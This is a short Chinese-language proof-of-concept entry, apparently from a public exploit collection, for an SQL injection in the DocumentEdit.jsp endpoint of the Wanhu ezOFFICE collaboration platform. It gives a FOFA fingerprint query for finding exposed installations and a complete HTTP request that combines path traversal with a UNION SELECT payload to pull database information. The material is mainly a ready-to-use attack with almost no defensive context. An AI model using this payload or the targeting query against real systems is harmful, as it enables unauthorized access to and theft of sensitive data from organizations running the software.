## 万户 ezOFFICE DocumentEdit.jsp SQL注入

DocumentEdit.jsp接口处存在sql注入漏洞，攻击者可获取数据库中敏感信息

## fofa
```
app="ezOFFICE协同管理平台"
```

## poc
```
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'%20union%20select%20null,null,(select%20user%20from%20dual),null,null,null,null,null,null,null%20from%20dual-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
```
![image](https://github.com/wy876/POC/assets/139549762/899ccb8d-22a3-4c5b-a50b-9d8a64ac73aa)
